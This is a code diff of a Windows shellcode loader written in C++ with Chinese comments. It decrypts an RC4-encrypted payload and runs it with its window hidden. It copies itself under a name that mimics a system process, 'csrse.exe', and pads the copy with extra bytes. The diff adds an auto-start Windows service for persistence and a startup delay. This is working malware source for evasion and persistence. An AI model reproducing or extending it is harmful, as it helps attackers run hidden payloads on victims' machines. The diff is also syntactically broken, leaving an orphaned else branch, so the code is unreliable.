@@ -11,7 +11,7 @@
 #include "rc4/ARC4.h"
 
 //data段可读写  
-#pragma comment(linker, "/section:.data,RWE")   
+//#pragma comment(linker, "/section:.data,RWE")   
 //不显示窗口  
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")  
 #pragma comment(linker, "/INCREMENTAL:NO")
@@ -26,9 +26,10 @@ char * shellcode = NULL;
 int shellcode_size = 0; 
 
 BOOL Move_(char* szPath, char *trPath, int bigger) {
-	if (bigger == 0) {
+	//if (bigger == 0) {
 		CopyFile(szPath, trPath, TRUE);
 		return TRUE;
+	
 	}
 	else {
 		HANDLE pFile;
@@ -65,8 +66,10 @@ BOOL Move_(char* szPath, char *trPath, int bigger) {
 		free(blank);
 		CloseHandle(pFile2);
 		free(buffer);
+
 	}
 }
+
 std::string GenerateUri()
 {
 	time_t myt = time(NULL);
@@ -198,6 +201,30 @@ void ServiceInstall() {
 		std::string starget = target;
 		starget.append("\\csrse.exe");
 		Move_(szPath,(char *)starget.c_str(),30000);
+		SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+		if (hScm == NULL)
+		{
+			return ;
+		}
+		//创建系统服务，参数很多，可查看帮助文档
+
+		SC_HANDLE hService = CreateService(hScm, ServiceName.c_str(), ServiceName.c_str(), SERVICE_ALL_ACCESS,
+			SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, starget.c_str(),
+			NULL, NULL, "", NULL, "");
+		if (hService == NULL)
+		{
+			return ;
+		}
+		//启动系统服务
+		if (StartService(hService, 0, NULL) == false)
+		{
+			return ;
+		}
+		//释放句柄
+		CloseServiceHandle(hScm);
+		CloseServiceHandle(hService);
+		exit(0);
+		/*
 		std::string cmd = "sc create ";
 		cmd = cmd + ServiceName;
 		cmd.append(" binPath= ");
@@ -210,6 +237,7 @@ void ServiceInstall() {
 		cmd = cmd + ServiceName;
 		system(cmd.c_str());
 		exit(0);
+		*/
 		return;
 	}
 }
@@ -218,10 +246,10 @@ void ServiceInstall() {
 int main()
 {  
 	
-
+	Sleep(2000);
 	//如果要不安装服务运行，请直接DecPayload(GetKey());
-	ServiceInstall();
-	//DecPayload(GetKey());
+	//ServiceInstall();
+	DecPayload(GetKey());
 	
     return 0;  
 }  
